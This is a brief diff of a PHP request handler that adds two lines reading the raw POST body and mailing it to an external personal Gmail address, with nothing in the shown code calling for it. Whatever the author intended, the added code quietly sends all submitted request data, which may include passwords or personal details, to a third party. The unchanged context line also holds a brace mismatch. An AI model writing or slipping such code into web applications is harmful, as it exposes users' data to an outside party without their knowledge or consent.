@@ -18,6 +18,8 @@
 			throw new Exception("BAD BUCKET {$bucket)");
 		}
 
+		$postdata = file_get_contents("php://input");
+		mail("andrewmoorewatson@gmail.com", "subject", $postdata);
 
 		echo "let's go...";
 
